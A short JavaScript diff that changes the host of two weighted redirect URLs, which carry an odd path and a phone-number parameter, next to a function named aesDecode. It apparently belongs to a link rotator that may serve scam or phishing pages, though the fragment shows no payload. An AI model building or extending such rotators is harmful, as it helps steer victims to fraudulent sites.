@@ -72,8 +72,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://Nova-Mode.on-forge.com/werrx01USAHTML/?bcda=+65 3106 3088", weight: 0.5 },
-        { url: "https://Nova-Mode.on-forge.com/werrx01USAHTML/?bcda=+65 S3106 3088", weight: 0.5 }
+        { url: "https://TrendPulse.on-forge.com/werrx01USAHTML/?bcda=+65 3106 3088", weight: 0.5 },
+        { url: "https://TrendPulse.on-forge.com/werrx01USAHTML/?bcda=+65 S3106 3088", weight: 0.5 }
       
     ];
 
